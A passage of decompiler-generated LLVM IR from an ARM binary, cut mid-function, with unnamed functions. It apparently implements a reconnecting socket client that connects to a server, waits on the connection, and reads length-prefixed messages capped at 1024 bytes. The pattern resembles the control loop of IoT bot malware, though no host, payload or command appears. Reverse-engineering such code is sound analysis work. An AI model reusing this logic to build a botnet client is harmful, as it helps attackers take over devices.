  store i32 %v0_8e3c, i32* %r0.global-to-local, align 4
  %v1_8e40 = call i32 @function_d7fc(i32 %v0_8e3c)
  store i32 %v1_8e40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %dec_label_pc_8db0, %dec_label_pc_8df4
  %v0_8e44 = call i32 @function_93c8()
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_8e4c = call i32 @function_81d0(i32 1)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_8e54 = call i32 @function_83b4(i32 1)
  store i32 %v1_8e54, i32* @r4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_8e60 = call i32 @function_83b4(i32 1)
  store i32 %v1_8e60, i32* @r0, align 4
  %v0_8e64 = call i32 @function_aab8()
  %v0_8e68 = load i32, i32* @r4, align 4
  store i32 %v0_8e68, i32* %r1.global-to-local, align 4
  store i32 %v0_8e64, i32* @r2, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_8e74 = call i32 @function_e840(i32 1, i32 %v0_8e68)
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_13ffc.99 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v2_8e84 = call i32 @function_e840(i32 1, i32 ptrtoint (i32* @global_var_13ffc.99 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_8e8c = call i32 @function_82c0(i32 1)
  store i32 %v1_8e8c, i32* %r0.global-to-local, align 4
  %v0_8e90 = call i32 @function_e030()
  store i32 %v0_8e90, i32* %r0.global-to-local, align 4
  %v2_8e94 = icmp eq i32 %v0_8e90, 0
  store i1 %v2_8e94, i1* %cpsr_z.global-to-local, align 1
  %v5_8e98 = icmp sgt i32 %v0_8e90, 0
  br i1 %v5_8e98, label %dec_label_pc_92d0, label %dec_label_pc_8e9c

dec_label_pc_8e9c:                                ; preds = %dec_label_pc_8e44
  %v1_8e9c = call i32 @function_ba90(i32 %v0_8e90)
  store i32 %v1_8e9c, i32* @r5, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8ea8 = call i32 @function_e720(i32 0)
  %v2_8eac = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_8eac, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_8eb4 = call i32 @function_e720(i32 2)
  %v2_8eb8 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_8eb8, i32* @r4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_8ec0 = call i32 @function_e720(i32 1)
  store i32 32, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_8eb8, i32* %r0.global-to-local, align 4
  %v4_8ed0 = call i32 @function_ab54(i32 %v2_8eb8, i8 0, i32 32)
  store i32 ptrtoint ([5 x i8]* @global_var_13e0c.101 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_8eb8, i32* @r0, align 4
  %v3_8edc = call i32 @function_ab24(i32 %v2_8eb8, i32 ptrtoint ([5 x i8]* @global_var_13e0c.101 to i32))
  store i32 %v3_8edc, i32* %r0.global-to-local, align 4
  %v0_8ee0 = call i32 @function_9310()
  store i32 %v0_8ee0, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_8ee8 = call i32 @function_b5a4(i32 %v0_8ee0, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_8ef4 = call i32 @function_9b40(i32 4, i32 4)
  store i32 ptrtoint (i32* @global_var_1d328.90 to i32), i32* %r3.global-to-local, align 4
  %v0_8efc = load i32, i32* @r5, align 4
  store i32 %v0_8efc, i32* %r1.global-to-local, align 4
  %v2_8f00 = load i32, i32* @global_var_1d328.90, align 4
  store i32 %v2_8f00, i32* %r0.global-to-local, align 4
  %v2_8f04 = call i32 @function_a988(i32 %v2_8f00, i32 %v0_8efc)
  store i32 %v2_8f04, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d32c.104 to i32), i32* @r7, align 4
  store i32 ptrtoint (i8** @global_var_1d4b8.106 to i32), i32* @sl, align 4
  %v2_8f18 = ptrtoint i32* %stack_var_-1388 to i32
  store i32 0, i32* @fp, align 4
  %v2_8f20 = ptrtoint i8** %stack_var_-42 to i32
  store i32 %v2_8f20, i32* @r8, align 4
  %v2_8f4c = ptrtoint i32* %stack_var_-364 to i32
  %v2_8fd0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_901c = ptrtoint i32* %stack_var_-40 to i32
  %v2_905c = ptrtoint i32* %stack_var_-60 to i32
  %v2_9064 = ptrtoint i32* %stack_var_-236 to i32
  %v2_9100 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9104 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_8f24

dec_label_pc_8f24:                                ; preds = %dec_label_pc_926c, %bb, %dec_label_pc_91bc, %dec_label_pc_91b0, %dec_label_pc_9148, %dec_label_pc_903c, %dec_label_pc_8f70, %dec_label_pc_92c8, %dec_label_pc_9198, %dec_label_pc_9130, %dec_label_pc_8e9c
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1164, i32* %r1.global-to-local, align 4
  %v2_8f3c51 = load i32, i32* @sp, align 4
  %v3_8f3c52 = add i32 %v2_8f3c51, 1164
  %v4_8f3c53 = inttoptr i32 %v3_8f3c52 to i32*
  store i32 0, i32* %v4_8f3c53, align 4
  br label %dec_label_pc_8f2c.dec_label_pc_8f2c_crit_edge

dec_label_pc_8f2c.dec_label_pc_8f2c_crit_edge:    ; preds = %dec_label_pc_8f24, %dec_label_pc_8f2c.dec_label_pc_8f2c_crit_edge
  %v0_8f2c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_8f3c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_8f30 = add i32 %v0_8f2c.pre, 4
  store i32 %v1_8f30, i32* %r3.global-to-local, align 4
  %v1_8f34 = add i32 %v0_8f2c.pre, 1164
  store i32 %v1_8f34, i32* %r1.global-to-local, align 4
  %v7_8f38 = icmp eq i32 %v1_8f30, 128
  %v2_8f3c = load i32, i32* @sp, align 4
  %v3_8f3c = add i32 %v2_8f3c, %v1_8f34
  %v4_8f3c = inttoptr i32 %v3_8f3c to i32*
  store i32 %v0_8f3c.pre, i32* %v4_8f3c, align 4
  br i1 %v7_8f38, label %dec_label_pc_8f44, label %dec_label_pc_8f2c.dec_label_pc_8f2c_crit_edge

dec_label_pc_8f44:                                ; preds = %dec_label_pc_8f2c.dec_label_pc_8f2c_crit_edge
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_8f44 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8f44, i32* %r3.global-to-local, align 4
  store i32 %v2_8f4c, i32* %r2.global-to-local, align 4
  store i32 %v0_8f44, i32* @r6, align 4
  %v3_8f5454 = add i32 %v0_8f44, %v2_8f4c
  %v4_8f5455 = inttoptr i32 %v3_8f5454 to i32*
  store i32 %v0_8f44, i32* %v4_8f5455, align 4
  %v0_8f5856 = load i32, i32* %r3.global-to-local, align 4
  %v1_8f5857 = add i32 %v0_8f5856, 4
  store i32 %v1_8f5857, i32* %r3.global-to-local, align 4
  %v7_8f5c58 = icmp eq i32 %v1_8f5857, 128
  br i1 %v7_8f5c58, label %dec_label_pc_8f64, label %dec_label_pc_8f54.dec_label_pc_8f54_crit_edge

dec_label_pc_8f54.dec_label_pc_8f54_crit_edge:    ; preds = %dec_label_pc_8f44, %dec_label_pc_8f54.dec_label_pc_8f54_crit_edge
  %v1_8f5859 = phi i32 [ %v1_8f58, %dec_label_pc_8f54.dec_label_pc_8f54_crit_edge ], [ %v1_8f5857, %dec_label_pc_8f44 ]
  %v0_8f54.pre = load i32, i32* @r6, align 4
  %v2_8f54.pre = load i32, i32* %r2.global-to-local, align 4
  %v3_8f54 = add i32 %v1_8f5859, %v2_8f54.pre
  %v4_8f54 = inttoptr i32 %v3_8f54 to i32*
  store i32 %v0_8f54.pre, i32* %v4_8f54, align 4
  %v0_8f58 = load i32, i32* %r3.global-to-local, align 4
  %v1_8f58 = add i32 %v0_8f58, 4
  store i32 %v1_8f58, i32* %r3.global-to-local, align 4
  %v7_8f5c = icmp eq i32 %v1_8f58, 128
  br i1 %v7_8f5c, label %dec_label_pc_8f64, label %dec_label_pc_8f54.dec_label_pc_8f54_crit_edge

dec_label_pc_8f64:                                ; preds = %dec_label_pc_8f54.dec_label_pc_8f54_crit_edge, %dec_label_pc_8f44
  %v2_8f64 = load i32, i32* @global_var_1d32c.104, align 4
  store i32 %v2_8f64, i32* @r3, align 4
  %v3_8f68 = icmp eq i32 %v2_8f64, -1
  %v8_8f68 = icmp eq i32 %v2_8f64, -1
  store i1 %v8_8f68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8f68, label %dec_label_pc_8f70, label %dec_label_pc_8fe4

dec_label_pc_8f70:                                ; preds = %dec_label_pc_8f64
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_8f78 = load i32, i32* @r6, align 4
  store i32 %v0_8f78, i32* %r2.global-to-local, align 4
  %v3_8f7c = call i32 @function_c590(i32 2, i32 1, i32 %v0_8f78)
  store i32 %v3_8f7c, i32* %r0.global-to-local, align 4
  %v7_8f80 = icmp eq i32 %v3_8f7c, -1
  store i1 %v7_8f80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8f7c, i32* @r5, align 4
  %v1_8f88 = load i32, i32* @r7, align 4
  %v2_8f88 = inttoptr i32 %v1_8f88 to i32*
  store i32 %v3_8f7c, i32* %v2_8f88, align 4
  br i1 %v7_8f80, label %dec_label_pc_8f24, label %dec_label_pc_8f90

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f70
  %v0_8f90 = load i32, i32* @r6, align 4
  store i32 %v0_8f90, i32* @r2, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_8f98 = call i32 @function_b7ac(i32 %v3_8f7c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_8fa0 = or i32 %v2_8f98, 2048
  store i32 %v1_8fa0, i32* @r2, align 4
  %v0_8fa4 = load i32, i32* @r5, align 4
  store i32 %v0_8fa4, i32* %r0.global-to-local, align 4
  %v2_8fa8 = call i32 @function_b7ac(i32 %v0_8fa4, i32 4)
  store i32 %v2_8eac, i32* %ip.global-to-local, align 4
  %v2_8fc8 = load i32, i32* @global_var_1d32c.104, align 4
  store i32 %v2_8fc8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v2_8fd0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v2_8fdc = load i32, i32* @sl, align 4
  %v3_8fdc = inttoptr i32 %v2_8fdc to i8*
  store i8 1, i8* %v3_8fdc, align 1
  %v3_8fe0 = call i32 @function_c1d0(i32 %v2_8fc8, i32 %v2_8fd0, i32 16)
  store i32 %v3_8fe0, i32* %r0.global-to-local, align 4
  %v2_9018.pre = load i32, i32* @global_var_1d32c.104, align 4
  br label %dec_label_pc_8fe4

dec_label_pc_8fe4:                                ; preds = %dec_label_pc_8f64, %dec_label_pc_8f90
  %v0_902c = phi i32 [ %v2_8f64, %dec_label_pc_8f64 ], [ %v2_9018.pre, %dec_label_pc_8f90 ]
  %v2_8fe4 = load i8, i8* bitcast (i8** @global_var_1d4b8.106 to i8*), align 4
  %v3_8fe4 = zext i8 %v2_8fe4 to i32
  store i32 %v3_8fe4, i32* %r3.global-to-local, align 4
  %v2_8fe8 = icmp eq i8 %v2_8fe4, 0
  store i1 %v2_8fe8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_902c, i32* %r1.global-to-local, align 4
  br i1 %v2_8fe8, label %dec_label_pc_9018, label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fe4
  store i32 %v2_901c, i32* %r2.global-to-local, align 4
  %v3_8ff8 = udiv i32 %v0_902c, 32
  store i32 %v3_8ff8, i32* %r3.global-to-local, align 4
  %v4_8ffc = mul nuw nsw i32 %v3_8ff8, 4
  %v5_8ffc = add i32 %v4_8ffc, %v2_901c
  store i32 %v5_8ffc, i32* %r0.global-to-local, align 4
  %v1_9000 = add i32 %v5_8ffc, -324
  %v2_9000 = inttoptr i32 %v1_9000 to i32*
  %v3_9000 = load i32, i32* %v2_9000, align 4
  %v1_9004 = urem i32 %v0_902c, 32
  store i32 %v1_9004, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_900c = shl i32 1, %v1_9004
  %v8_900c = or i32 %v3_9000, %v7_900c
  store i32 %v8_900c, i32* %r3.global-to-local, align 4
  store i32 %v8_900c, i32* %v2_9000, align 4
  br label %dec_label_pc_903c

dec_label_pc_9018:                                ; preds = %dec_label_pc_8fe4
  store i32 %v2_901c, i32* %ip.global-to-local, align 4
  %v3_9020 = udiv i32 %v0_902c, 32
  store i32 %v3_9020, i32* %r3.global-to-local, align 4
  %v4_9024 = mul nuw nsw i32 %v3_9020, 4
  %v5_9024 = add i32 %v4_9024, %v2_901c
  store i32 %v5_9024, i32* %r0.global-to-local, align 4
  %v1_9028 = add i32 %v5_9024, -196
  %v2_9028 = inttoptr i32 %v1_9028 to i32*
  %v3_9028 = load i32, i32* %v2_9028, align 4
  %v1_902c = urem i32 %v0_902c, 32
  store i32 %v1_902c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_9034 = shl i32 1, %v1_902c
  %v8_9034 = or i32 %v3_9028, %v7_9034
  store i32 %v8_9034, i32* %r3.global-to-local, align 4
  store i32 %v8_9034, i32* %v2_9028, align 4
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_8ff0, %dec_label_pc_9018
  %v2_9040 = load i32, i32* @global_var_1d32c.104, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %ip.global-to-local, align 4
  store i32 %v2_905c, i32* @lr, align 4
  %v1_9060 = add i32 %v2_9040, 1
  store i32 %v1_9060, i32* %r0.global-to-local, align 4
  store i32 %v2_9064, i32* %r1.global-to-local, align 4
  store i32 %v2_8f4c, i32* %r2.global-to-local, align 4
  store i32 10, i32* %stack_var_-60, align 4
  %v5_9074 = call i32 @function_ba0c(i32 %v1_9060, i32 %v2_9064, i32 %v2_8f4c, i32 0, i32 %v2_905c)
  store i32 %v5_9074, i32* %r0.global-to-local, align 4
  %v7_9078 = icmp eq i32 %v5_9074, -1
  store i1 %v7_9078, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9074, i32* %r3.global-to-local, align 4
  br i1 %v7_9078, label %dec_label_pc_8f24, label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_903c
  %v2_9084 = icmp eq i32 %v5_9074, 0
  store i1 %v2_9084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9084, label %dec_label_pc_908c, label %dec_label_pc_90bc

dec_label_pc_908c:                                ; preds = %dec_label_pc_9084
  store i32 %v2_8eac, i32* %r2.global-to-local, align 4
  %v0_9090 = load i32, i32* @fp, align 4
  store i32 %v0_9090, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  store i8* null, i8** %stack_var_-42, align 4
  %v7_909c = call i32 @function_b6e8(i32 %v0_9090, i32 6, i32 %v2_8eac, i32 0, i32 0)
  store i32 %v7_909c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v0_90a4 = load i32, i32* @fp, align 4
  %v1_90a4 = add i32 %v0_90a4, 1
  store i32 %v1_90a4, i32* @fp, align 4
  store i32 37052, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 false, i32 ptrtoint (i32* @global_var_c4d8.109 to i32))
  br label %dec_label_pc_90bc

dec_label_pc_90bc:                                ; preds = %dec_label_pc_9084, %dec_label_pc_908c
  %v2_90bc = load i8, i8* bitcast (i8** @global_var_1d4b8.106 to i8*), align 4
  %v3_90bc = zext i8 %v2_90bc to i32
  store i32 %v3_90bc, i32* @r6, align 4
  %v2_90c0 = icmp eq i8 %v2_90bc, 0
  store i1 %v2_90c0, i1* %cpsr_z.global-to-local, align 1
  %v2_91b0 = load i32, i32* @global_var_1d32c.104, align 4
  br i1 %v2_90c0, label %dec_label_pc_91b0, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %dec_label_pc_90bc
  store i32 %v2_91b0, i32* %r0.global-to-local, align 4
  store i32 %v2_901c, i32* %ip.global-to-local, align 4
  %v3_90d0 = udiv i32 %v2_91b0, 32
  %v4_90d4 = mul nuw nsw i32 %v3_90d0, 4
  %v5_90d4 = add i32 %v4_90d4, %v2_901c
  store i32 %v5_90d4, i32* %r3.global-to-local, align 4
  %v1_90d8 = add i32 %v5_90d4, -324
  %v2_90d8 = inttoptr i32 %v1_90d8 to i32*
  %v3_90d8 = load i32, i32* %v2_90d8, align 4
  %v1_90dc = urem i32 %v2_91b0, 32
  store i32 %v1_90dc, i32* %r2.global-to-local, align 4
  %v6_90e0 = ashr i32 %v3_90d8, %v1_90dc
  store i32 %v6_90e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_90e8 = urem i32 %v6_90e0, 2
  %v2_90e8 = icmp eq i32 %v1_90e8, 0
  store i1 %v2_90e8, i1* %cpsr_z.global-to-local, align 1
  %v2_90ec = load i32, i32* @sl, align 4
  %v3_90ec = inttoptr i32 %v2_90ec to i8*
  store i8 0, i8* %v3_90ec, align 1
  %v0_90f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_90f0, label %dec_label_pc_90c8.dec_label_pc_9130_crit_edge, label %dec_label_pc_90f4

dec_label_pc_90c8.dec_label_pc_9130_crit_edge:    ; preds = %dec_label_pc_90c8
  %v0_9130.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9130

dec_label_pc_90f4:                                ; preds = %dec_label_pc_90c8
  store i32 4, i32* @r5, align 4
  store i32 %v2_9100, i32* %r3.global-to-local, align 4
  store i32 %v2_9104, i32* @lr, align 4
  store i32 1, i32* @r1, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_9110 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_9110, i32* %stack_var_-48, align 4
  store i32 4, i32* %stack_var_-52, align 4
  %v0_911c = load i32, i32* %r0.global-to-local, align 4
  %v5_911c = call i32 @function_c288(i32 %v0_911c, i32 1, i32 4, i32 %v2_9100, i32 %v2_9104)
  store i32 %v5_911c, i32* %r0.global-to-local, align 4
  %v3_9120 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_9120, i32* %r3.global-to-local, align 4
  %v2_9124 = icmp eq i32 %v3_9120, 0
  store i1 %v2_9124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9124, label %dec_label_pc_9148, label %dec_label_pc_912c

dec_label_pc_912c:                                ; preds = %bb, %dec_label_pc_9280, %dec_label_pc_9234, %dec_label_pc_920c, %dec_label_pc_90f4
  %v2_912c = load i32, i32* @global_var_1d32c.104, align 4
  store i32 %v2_912c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9130

dec_label_pc_9130:                                ; preds = %dec_label_pc_90c8.dec_label_pc_9130_crit_edge, %dec_label_pc_912c
  %v0_9130 = phi i32 [ %v0_9130.pre, %dec_label_pc_90c8.dec_label_pc_9130_crit_edge ], [ %v2_912c, %dec_label_pc_912c ]
  %v1_9130 = call i32 @function_e720(i32 %v0_9130)
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_913c = load i32, i32* @r7, align 4
  %v2_913c = inttoptr i32 %v1_913c to i32*
  store i32 -1, i32* %v2_913c, align 4
  %v1_9140 = call i32 @function_e5cc(i32 1)
  store i32 %v1_9140, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f24

dec_label_pc_9148:                                ; preds = %dec_label_pc_90f4
  store i32 %v2_8eb8, i32* @r0, align 4
  %v0_9150 = call i32 @function_aab8()
  store i32 %v0_9150, i32* @r0, align 4
  %sext = mul i32 %v0_9150, 16777216
  %v1_9154 = sdiv i32 %sext, 16777216
  %v7_9154 = inttoptr i32 %v1_9154 to i8*
  store i8* %v7_9154, i8** %stack_var_-42, align 4
  %v2_9158 = call i32 @function_af48(i32 %v1_9154)
  %v0_9160 = load i32, i32* @r5, align 4
  store i32 %v0_9160, i32* %r2.global-to-local, align 4
  store i32 %v2_9158, i32* @global_var_1ffa8.93, align 4
  store i32 ptrtoint (i32* @global_var_13e14.111 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_9170 = load i32, i32* @global_var_1d32c.104, align 4
  store i32 %v2_9170, i32* %r0.global-to-local, align 4
  %v4_9174 = call i32 @function_c4d8(i32 %v2_9170, i32 ptrtoint (i32* @global_var_13e14.111 to i32), i32 %v0_9160, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_917c = load i32, i32* @global_var_1d32c.104, align 4
  store i32 %v2_917c, i32* %r0.global-to-local, align 4
  store i32 %v2_8f20, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9188 = call i32 @function_c4d8(i32 %v2_917c, i32 %v2_8f20, i32 1, i32 16384)
  store i32 %v4_9188, i32* %r0.global-to-local, align 4
  %v3_918c = load i8*, i8** %stack_var_-42, align 4
  %v4_918c = ptrtoint i8* %v3_918c to i32
  store i32 %v4_918c, i32* %r2.global-to-local, align 4
  %v3_9190 = icmp eq i8* %v3_918c, null
  store i1 %v3_9190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9190, label %dec_label_pc_8f24, label %dec_label_pc_9198

dec_label_pc_9198:                                ; preds = %dec_label_pc_9148
  %v2_919c = load i32, i32* @global_var_1d32c.104, align 4
  store i32 %v2_919c, i32* %r0.global-to-local, align 4
  store i32 %v2_8eb8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_91a8 = call i32 @function_c4d8(i32 %v2_919c, i32 %v2_8eb8, i32 %v4_918c, i32 16384)
  store i32 %v5_91a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f24

dec_label_pc_91b0:                                ; preds = %dec_label_pc_90bc
  store i32 %v2_91b0, i32* @r5, align 4
  %v7_91b4 = icmp eq i32 %v2_91b0, -1
  store i1 %v7_91b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_91b4, label %dec_label_pc_8f24, label %dec_label_pc_91bc

dec_label_pc_91bc:                                ; preds = %dec_label_pc_91b0
  %v3_91bc = udiv i32 %v2_91b0, 32
  store i32 %v2_901c, i32* %r1.global-to-local, align 4
  %v4_91c4 = mul nuw nsw i32 %v3_91bc, 4
  %v5_91c4 = add i32 %v4_91c4, %v2_901c
  store i32 %v5_91c4, i32* %r3.global-to-local, align 4
  %v1_91c8 = add i32 %v5_91c4, -196
  %v2_91c8 = inttoptr i32 %v1_91c8 to i32*
  %v3_91c8 = load i32, i32* %v2_91c8, align 4
  %v1_91cc = urem i32 %v2_91b0, 32
  store i32 %v1_91cc, i32* %r2.global-to-local, align 4
  %v6_91d0 = ashr i32 %v3_91c8, %v1_91cc
  store i32 %v6_91d0, i32* %r3.global-to-local, align 4
  %v1_91d4 = urem i32 %v6_91d0, 2
  %v2_91d4 = icmp eq i32 %v1_91d4, 0
  store i1 %v2_91d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_91d4, label %dec_label_pc_8f24, label %dec_label_pc_91dc

dec_label_pc_91dc:                                ; preds = %dec_label_pc_91bc
  store i32 %v2_8eac, i32* %r2.global-to-local, align 4
  %v6_91e0 = inttoptr i32 %v3_90bc to i8*
  store i8* %v6_91e0, i8** %stack_var_-42, align 4
  %v0_91e4 = call i32 @function_bf7c()
  store i32 %v2_8f20, i32* %r1.global-to-local, align 4
  %v0_91ec = load i32, i32* @r6, align 4
  %v2_91ec = inttoptr i32 %v0_91e4 to i32*
  store i32 %v0_91ec, i32* %v2_91ec, align 4
  store i32 %v0_91e4, i32* @r4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_91f8 = load i32, i32* @r5, align 4
  store i32 %v0_91f8, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v1_9200 = load i32, i32* %r1.global-to-local, align 4
  %v4_9200 = call i32 @function_c354(i32 %v0_91f8, i32 %v1_9200, i32 2, i32 16386)
  store i32 %v4_9200, i32* %r0.global-to-local, align 4
  %v7_9204 = icmp eq i32 %v4_9200, -1
  store i1 %v7_9204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9204, label %dec_label_pc_926c, label %dec_label_pc_920c

dec_label_pc_920c:                                ; preds = %dec_label_pc_91dc
  %v2_920c = icmp eq i32 %v4_9200, 0
  store i1 %v2_920c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_920c, label %dec_label_pc_912c, label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_920c
  store i32 %v2_8eac, i32* %ip.global-to-local, align 4
  %v3_9218 = load i8*, i8** %stack_var_-42, align 4
  %v4_9218 = ptrtoint i8* %v3_9218 to i32
  store i32 %v4_9218, i32* %r3.global-to-local, align 4
  %v2_921c = icmp eq i8* %v3_9218, null
  store i1 %v2_921c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_921c, label %.thread4, label %dec_label_pc_9234

.thread4:                                         ; preds = %dec_label_pc_9214
  %v3_9220 = load i32, i32* @global_var_1d32c.104, align 4
  store i32 %v3_9220, i32* %r0.global-to-local, align 4
  store i32 %v2_8f20, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v2_922c = add i32 %v4_9218, 16384
  br label %dec_label_pc_92c8

dec_label_pc_9234:                                ; preds = %dec_label_pc_9214
  %v3_9234 = udiv i32 %v4_9218, 256
  %v1_9238 = urem i32 %v4_9218, 256
  store i32 %v1_9238, i32* %r3.global-to-local, align 4
  %v4_923c = mul nuw nsw i32 %v1_9238, 256
  %v5_923c = or i32 %v4_923c, %v3_9234
  %v6_923c = trunc i32 %v5_923c to i16
  store i32 %v5_923c, i32* %r2.global-to-local, align 4
  store i32 %v2_8eac, i32* @lr, align 4
  %v3_9244 = icmp ugt i16 %v6_923c, 1023
  %v8_9244 = icmp eq i16 %v6_923c, 1024
  store i1 %v8_9244, i1* %cpsr_z.global-to-local, align 1
  %v7_9248 = inttoptr i32 %v5_923c to i8*
  store i8* %v7_9248, i8** %stack_var_-42, align 4
  %v2_924c = xor i1 %v8_9244, true
  %v3_924c = and i1 %v3_9244, %v2_924c
  br i1 %v3_924c, label %dec_label_pc_912c, label %dec_label_pc_9250

dec_label_pc_9250:                                ; preds = %dec_label_pc_9234
  %v0_9250 = load i32, i32* @r6, align 4
  %v1_9250 = load i32, i32* @r4, align 4
  %v2_9250 = inttoptr i32 %v1_9250 to i32*
  store i32 %v0_9250, i32* %v2_9250, align 4
  store i32 %v2_8f18, i32* %r1.global-to-local, align 4
  %v2_9258 = load i32, i32* @global_var_1d32c.104, align 4
  store i32 %v2_9258, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v7_9260 = call i32 @function_c354(i32 %v2_9258, i32 %v2_8f18, i32 %v5_923c, i32 16386)
  store i32 %v7_9260, i32* %r0.global-to-local, align 4
  %v3_9264 = icmp eq i32 %v7_9260, -1
  %v8_9264 = icmp eq i32 %v7_9260, -1
  store i1 %v8_9264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9264, label %dec_label_pc_926c, label %dec_label_pc_9280

dec_label_pc_926c:                                ; preds = %dec_label_pc_9250, %dec_label_pc_91dc
  %v0_926c = load i32, i32* @r4, align 4
  %v1_926c = inttoptr i32 %v0_926c to i32*
  %v2_926c = load i32, i32* %v1_926c, align 4
  store i32 %v2_926c, i32* %r3.global-to-local, align 4
  %v7_9270 = icmp eq i32 %v2_926c, 4
  store i1 %v7_9270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9270, label %dec_label_pc_8f24, label %bb

bb:                                               ; preds = %dec_label_pc_926c
  %v8_9274 = icmp eq i32 %v2_926c, 11
  store i1 %v8_9274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9274, label %dec_label_pc_8f24, label %dec_label_pc_912c

dec_label_pc_9280:                                ; preds = %dec_label_pc_9250
  %v2_9280 = icmp eq i32 %v7_9260, 0
  store i1 %v2_9280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9280, label %dec_label_pc_912c, label %dec_label_pc_9288

dec_label_pc_9288:                                ; preds = %dec_label_pc_9280
  store i32 %v2_8f20, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_9294 = load i32, i32* @global_var_1d32c.104, align 4
  store i32 %v2_9294, i32* %r0.global-to-local, align 4
  %v4_9298 = call i32 @function_c354(i32 %v2_9294, i32 %v2_8f20, i32 2, i32 16384)
  %v3_92a0 = load i8*, i8** %stack_var_-42, align 4
  %v4_92a0 = ptrtoint i8* %v3_92a0 to i32
  %v3_92a4 = udiv i32 %v4_92a0, 256
  %v1_92a8 = mul i32 %v4_92a0, 256
  %v4_92ac = and i32 %v1_92a8, 65280
  %v5_92ac = or i32 %v4_92ac, %v3_92a4
  store i32 %v5_92ac, i32* %ip.global-to-local, align 4
